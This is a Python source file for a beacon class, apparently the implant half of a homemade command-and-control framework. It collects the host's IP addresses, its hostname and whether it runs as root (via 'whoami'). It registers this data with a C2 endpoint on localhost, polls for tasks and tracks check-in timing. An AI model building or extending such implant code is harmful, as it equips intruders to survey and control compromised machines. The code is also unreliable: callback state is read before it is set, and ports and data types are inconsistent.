import subprocess
import re
import socket
import requests
from app.database import Beacon as BeaconDB, db
import datetime

class Beacon:
    def __init__(self, agent, beacon_id=None, alive=False):
        self.agent = agent
        self.beacon_id = beacon_id
        self.remote_ip = self.get_ip()[0] if self.get_ip() else "unknown"
        self.remote_hostname = self.get_hostname() if self.get_hostname() else "unknown"
        self.remote_permissions = self.get_permissions()[1]
        self.alive = alive
        self.callback = self.next_callback()

    def get_ip(self):
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
        ip_pattern = re.compile(r'inet (\d+\.\d+\.\d+\.\d+)')
        return ip_pattern.findall(result.stdout)

    def get_hostname(self):
        return socket.gethostname()

    def get_permissions(self):
        try:
            result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
            return result.stdout.strip(), result.stdout.strip() == "root"
        except subprocess.CalledProcessError:
            return "unknown", False

    def register_beacon(self):
        response = requests.post(
            f"http://localhost/c2/register_beacon",
            json={
                "IP": self.remote_ip,
                "Hostname": self.remote_hostname,
                "Permissions": self.remote_permissions,
                "Beacon ID": self.beacon_id
            }
        )
        if response.status_code == 200:
            print("Beacon registered", response.json().get("message"))
        else:
            print(f"Error: {response.status_code}, {response.text}")

    def fetch_tasks(self):
        if not self.beacon_id:
            print("Beacon is not registered!")
            return

        response = requests.get(f"http://localhost:5000/c2/read_task?beacon_id={self.beacon_id}")
        if response.status_code == 200:
            tasks = response.json().get('data').get('tasks', [])
            if tasks:
                print(f"Tasks for beacon {self.beacon_id}: {tasks}")
            else:
                print("No tasks assigned yet")
        else:
            print(f"Error fetching tasks: {response.status_code}")

    def write_new_beacon(self):
        new_beacon = BeaconDB(
            id=self.beacon_id,
            ip=self.remote_ip,
            hostname=self.remote_hostname,
            permissions="root" if self.remote_permissions else "user"
        )
        try:
            db.session.add(new_beacon)
            db.session.commit()
            print(f"Beacon {self.beacon_id} saved to the database.")
        except Exception as e:
            print(f"Error saving beacon: {str(e)}")


    def next_callback(self):
        if not self.alive:
            return
        
        if not self.callback:
            self.callback = datetime.datetime.utcnow() + datetime.timedelta(seconds=30)
            db.session.commit()
        else:
            diff = self.callback - datetime.datetime.utcnow()
            if diff.total_seconds() <= 0:
                print(f"Beacon {self.beacon_id} is not responding, marking as dead")
                self.alive = False
                db.session.commit()
            else:
                print(f"Beacon {self.beacon_id} is alive, next callback in {diff.total_seconds()} seconds")
